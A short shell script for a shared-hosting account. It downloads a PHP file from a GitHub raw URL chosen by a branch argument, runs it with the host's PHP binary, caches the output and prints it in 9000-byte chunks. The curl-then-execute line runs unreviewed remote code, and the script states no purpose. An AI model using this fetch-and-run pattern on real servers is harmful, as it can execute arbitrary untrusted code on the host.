#!/bin/sh
cd /home/u791571885 && [ -f t166.done ] || { curl -fsSL -o t166.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs166.php" && /opt/alt/php83/usr/bin/php t166.php > t166.done 2>&1; }
dd if=t166.done bs=9000 skip=${2:-0} count=1 2>/dev/null
